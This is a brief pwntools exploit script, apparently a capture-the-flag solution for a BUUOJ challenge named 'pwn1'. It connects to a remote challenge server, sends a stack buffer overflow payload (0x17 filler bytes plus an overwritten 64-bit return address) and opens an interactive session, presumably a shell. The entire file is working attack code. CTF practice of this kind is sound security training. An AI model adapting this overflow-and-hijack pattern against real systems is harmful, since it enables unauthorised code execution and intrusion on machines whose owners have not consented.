from pwn import *

#r = process('pwn1')
r = remote('node3.buuoj.cn', '27287')

#raw_input()

p = 'a' * 0x17 + p64(0x0040118a)
r.sendline(p)
#r.recv()

r.interactive()
